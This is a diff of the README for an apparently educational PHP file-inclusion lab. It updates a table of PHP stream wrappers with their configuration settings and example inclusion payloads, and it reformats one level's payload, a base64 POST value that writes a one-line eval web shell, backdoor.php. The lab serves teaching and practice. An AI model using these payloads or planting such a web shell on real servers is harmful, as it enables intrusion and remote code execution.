@@ -69,16 +69,16 @@ if (isset($_GET["wrappers"])) {
 
 Level 1 ~ Level 9 为协议部分的知识关卡，这部分在PHP手册也叫封装协议 - [【PHP手册 - 支持的协议和封装协议(wrappers)】](https://www.php.net/manual/zh/wrappers.php)
 
-| 协议名称 | 功能 | 依赖 | 示例 |
-| -------- | ---- | ---- | ---- |
-| `file://` | 访问本地文件系统 |**无**|`file:///flag`|
-| `data://` | 数据（RFC 2397） |`allow_url_fopen`:**On**<br /> `allow_url_include` :**On**|`data://text/plain,<?php phpinfo();?>`<br /> `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+`|
-| `http://` | 访问 HTTP(s) 网址 |`allow_url_fopen`:**On**<br /> `allow_url_include` :**On**|`https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI`|
-| `php://` | 访问各个输入/输出流（I/O streams） | 基于参数 |`php://xxx`|
-| `php://input` | 访问请求的原始数据的只读流（RAW模式下POST中的DATA数据块） | `allow_url_include` :**On** |`php://input` + [POST DATA部分]|
-| `php://filter` | 用于数据流打开时的筛选过滤应用 | **无** |`php://filter/x=A\|B\|C\|/resouce=xxx`|
-| `zlib:// bzip2:// zip://` | 压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，支持任意后缀。 |**无**|?|
-| `phar://` | PHP 归档 |？|？|
+| 协议名称                           | 功能                                                         | `allow_url_fopen` | `allow_url_include` | 示例                                                         |
+| ---------------------------------- | ------------------------------------------------------------ | ----------------- | ------------------- | ------------------------------------------------------------ |
+| `file://`                          | 访问本地文件系统                                             | **Off/On**        | **无**              | `file:///flag`                                               |
+| `data://`                          | 数据（RFC 2397）                                             | **On**            | **On**              | `data://text/plain,<?php phpinfo();?>`<br /> `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+` |
+| `http://`                          | 访问 HTTP(s) 网址                                            | **On**            | **On**              | `https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI` |
+| `php://`                           | 访问各个输入/输出流（I/O streams）                           | **Off/On**        | 基于参数            | `php://xxx`                                                  |
+| `php://input`                      | 访问请求的原始数据的只读流（RAW模式下POST中的DATA数据块）    | **Off/On**        | **On**              | `php://input` + [POST DATA部分]                              |
+| `php://filter`                     | 用于数据流打开时的筛选过滤应用                               | **Off/On**        | **Off/On**          | `php://filter/x=A\|B\|C\|/resouce=xxx`                       |
+| `zlib:// compress.bzip2:// zip://` | 压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，支持任意后缀。 | **Off/On**        | **Off/On**          | `zip://[压缩文件绝对路径]#[压缩文件内的子文件名]`<br />`compress.zlib://file.gz` <br />`compress.bzip2://file.bz2` |
+| `phar://`                          | PHP 归档                                                     |                   | ？                  | ？                                                           |
 
 协议的介绍请跟进每个关卡中注释引导部分。
 
@@ -291,7 +291,9 @@ Payload：
 
 **POST**：`data=PD9waHAgZXZhbCgkX1BPU1RbJ2hlbGwnXSk7Pz4`
 
-（backdoor.php : <?php eval($_POST['hell']);?>）
+```php
+backdoor.php : <?php eval($_POST['hell']);?>
+```
 
 ### Level 11- 封装协议解析
 
